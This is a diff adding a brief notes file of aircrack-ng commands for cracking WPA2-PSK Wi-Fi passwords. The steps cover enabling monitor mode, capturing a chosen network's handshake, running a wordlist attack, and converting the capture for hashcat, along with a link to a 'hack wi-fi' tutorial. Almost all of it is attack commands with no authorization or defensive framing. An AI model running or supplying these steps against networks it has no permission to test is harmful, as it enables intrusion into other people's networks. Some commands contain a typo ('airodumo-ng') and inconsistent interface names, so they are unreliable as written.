@@ -1,0 +1,31 @@
+(Good link: http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/)
+
+Enabling wireless adapter:
+
+airmon-ng
+iwconfig
+
+Once have wireless interface name:
+
+airmon-ng start <interface>
+airmon-ng 
+
+(Check the final monitor interface, it might have been renamed)
+
+Once we have monitor enabled, check available ssids using:
+
+airodumo-ng wlan0mon
+
+Once we've picked an SSID, focus on it using:
+-- NOTE: capfile is placed in current working directory
+
+airodump-ng --bssid <BSSID> -c <channel> --write <capfile> mon0
+
+Crack password using aircrack-ng:
+
+aircrack-ng -w <dictionary> -b <BSSID> <filename.cap>
+
+# aircrack-ng -w ~/Downloads/wordlists/Super-WPA -b 00:00:00:00:00:00 test.cap-01.cap
+
+Converting captured file into a format that can be cracked by hashcat:
+# aircrack-ng <filename.cap> -J <filename.hccap>
